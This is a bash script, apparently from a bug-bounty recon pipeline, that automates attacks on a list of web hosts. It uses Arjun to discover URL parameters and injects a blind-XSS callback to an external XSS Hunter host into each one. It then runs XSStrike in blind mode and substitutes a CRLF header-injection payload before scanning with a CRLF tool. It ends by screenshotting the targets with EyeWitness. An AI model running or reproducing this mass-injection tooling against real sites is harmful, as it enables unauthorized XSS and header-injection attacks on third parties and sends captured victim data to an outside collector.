#!/bin/bash
cd /root/script/3_httprobe
rm -rf /root/script/3_httprobe/Arjun
git clone https://github.com/s0md3v/Arjun
curl -L https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict/AllParam.txt | grep -oP '(?<=\ class\=\"blob\-code\ blob\-code\-inner\ js\-file\-line\"\>).*?(?=\<\/td\>)' >> /root/script/3_httprobe/Arjun/db/params.txt ; sort -u /root/script/3_httprobe/Arjun/db/params.txt -o /root/script/3_httprobe/Arjun/db/params.txt
input=httprobe.txt ; export input=httprobe.txt

i=1
num=1
for line in `cat $input`

do

mkdir /root/script/3_httprobe/dir_$i
echo '#!/bin/bash' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'input=httprobe.txt' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cd /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cp -r /root/script/3_httprobe/Arjun/* /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "python3 arjun.py -u \"$line\" --stable -o 1.txt --get" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'grep -oP "param\"\:\ \".*" 1.txt | grep -oP "\ \".*\"" | sed -e "s/\"//g" | sed -e "s/\ //g" > 2.txt' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'for param in `cat 2.txt`; do line=`head -$num /root/script/3_httprobe/$input | tail -1` ; echo "${line}" > togrep.txt ; touch toif.txt ; grep -o "?" togrep.txt > toif.txt ; if [ -s toif.txt ]; then echo "${line}&${param}=https://xsshunternihao.xss.ht" >> /root/script/3_httprobe/params_xss_test.txt; else echo "${line}?${param}=https://xsshunternihao.xss.ht" >> /root/script/3_httprobe/params_xss_test.txt; fi; rm togrep.txt ; rm toif.txt ; num=$((num+1)) ; done' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "rm -rf /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "bash /root/script/3_httprobe/dir_$i/${i}.sh" >> /root/script/3_httprobe/exe.sh
i=$((i+1))

done
cat /root/script/3_httprobe/exe.sh | parallel --jobs 0 --delay 0.6 --retries 1 --timeout 366
rm /root/script/3_httprobe/exe.sh
rm /root/script/3_httprobe/dir_* -r

cd /root/script/3_httprobe

sort -u /root/script/3_httprobe/httprobe.txt -o /root/script/3_httprobe/httprobe.txt ; sort -u /root/script/3_httprobe/params_xss_test.txt -o /root/script/3_httprobe/params_xss_test.txt
grep ".json" /root/script/3_httprobe/httprobe.txt >> /root/script/3_httprobe/httprobe_json.txt
sed -e "s/.json/.html/g" /root/script/3_httprobe/httprobe_json.txt >> /root/script/3_httprobe/params_xss_test.txt ; rm /root/script/3_httprobe/httprobe_json.txt
cat /root/script/3_httprobe/params_xss_test.txt >> /root/script/3_httprobe/httprobe.txt ; sort -u /root/script/3_httprobe/httprobe.txt -o /root/script/3_httprobe/httprobe.txt ; rm /root/script/3_httprobe/params_xss_test.txt
ls ; wc -l $input ; du -h
vl -t 15 -s 50 httprobe.txt | grep -v "\[50" | grep -v "\[404" | grep -oP "http.*" >> httprobe1.txt ; mv httprobe1.txt httprobe.txt ; sort -u httprobe.txt -o httprobe.txt
vl=`ps -A | grep vl | awk '{print $1}' | sed 's/[[:space:]]//g'`
for line in $vl
do
kill -9 $line
done












#xsstrike

#创建目录
output=$output ; export output=$output
rm -rf /root/script/3_httprobe/XSStrike
cd /root/script/3_httprobe ; git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt
bash /root/script/xss.sh
i=1
echo '#!/bin/bash' >> /root/script/3_httprobe/exe.sh

shuf /root/script/3_httprobe/httprobe.txt -o /root/script/3_httprobe/httprobe1.txt ; mv /root/script/3_httprobe/httprobe1.txt /root/script/3_httprobe/httprobe.txt
cd /root/script/3_httprobe
for line in `cat $input`
do

mkdir /root/script/3_httprobe/dir_$i

echo '#!/bin/bash' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo 'input=httprobe.txt' >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cd /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "echo '$line' >> /root/script/3_httprobe/dir_${i}/${input}" >> /root/script/3_httprobe/dir_${i}/${i}.sh
echo "cp -r /root/script/3_httprobe/XSStrike/* /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "for c in "\`cat /root/script/3_httprobe/dir_$i/${input}\`"; do echo \" \" >> /root/script/3_httprobe/dir_${i}/xss.txt ; echo \" \" >> /root/script/3_httprobe/dir_${i}/xss.txt ; echo \" \" >> /root/script/3_httprobe/dir_${i}/xss.txt ; echo \"\$c\" >> /root/script/3_httprobe/dir_${i}/xss.txt ; echo '------- ------------ ------------ -------------' >> /root/script/3_httprobe/dir_${i}/xss.txt ; python3 xsstrike.py -u \"\$c\" --skip --blind >> /root/script/3_httprobe/dir_${i}/xss.txt ; line=\`cat /root/script/3_httprobe/dir_${i}/xss.txt | grep Efficiency\` ; if [ \"\$line\" = \"\" ]; then > /root/script/3_httprobe/dir_${i}/xss.txt ; fi; cat /root/script/3_httprobe/dir_${i}/xss.txt | sed \"/Progress/d\" >> \${output}/xsstrike.txt ; rm /root/script/3_httprobe/dir_${i}/xss.txt; done" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "cd /root/script/3_httprobe; rm -r /root/script/3_httprobe/dir_$i" >> /root/script/3_httprobe/dir_$i/${i}.sh
echo "bash /root/script/3_httprobe/dir_$i/${i}.sh" >> /root/script/3_httprobe/exe.sh
i=$((i+1))

done
cat /root/script/3_httprobe/exe.sh | parallel --jobs 0 --delay 0.6 --retries 1 --timeout 366
rm /root/script/3_httprobe/exe.sh
rm dir_* -r

rm /root/script/3_httprobe/params_xss_test.txt
ls ; wc -l $output/xss.txt
sed "s,https://xsshunternihao.xss.ht,%0d%0aheader:CRLFheader,g" /root/script/3_httprobe/httprobe.txt >> /root/script/3_httprobe/httprob1e.txt ; cat /root/script/3_httprobe/httprob1e.txt >> /root/script/3_httprobe/httprobe.txt ; rm /root/script/3_httprobe/httprob1e.txt
cd /root/script/3_httprobe/pentest-tools
python3 crlf.py -u /root/script/3_httprobe/httprobe.txt -v 1 -t 1 | grep VULN >> $output/CRLF.txt
#Eyewitness
cd /root/script/4_getjs
rm -r EyeWitness
cd /root/script/4_getjs
git clone https://github.com/FortyNorthSecurity/EyeWitness
cd EyeWitness/setup ; bash setup.sh ; bash setup.sh ; pip3 install --upgrade pyasn1-modules
mkdir $output/httprobe
mkdir /root/z_juice/2_httprobe
cd /root/script/4_getjs/EyeWitness
python3 EyeWitness.py -f /root/script/3_httprobe/httprobe.txt --timeout 16 --web --no-prompt -d $output/httprobe
cp $output/httprobe/screens/* /root/z_juice/2_httprobe

date "+%Y-%m-%d_%H:%M:%S" >> /root/date.txt ; echo 'params' >> /root/date.txt
exit
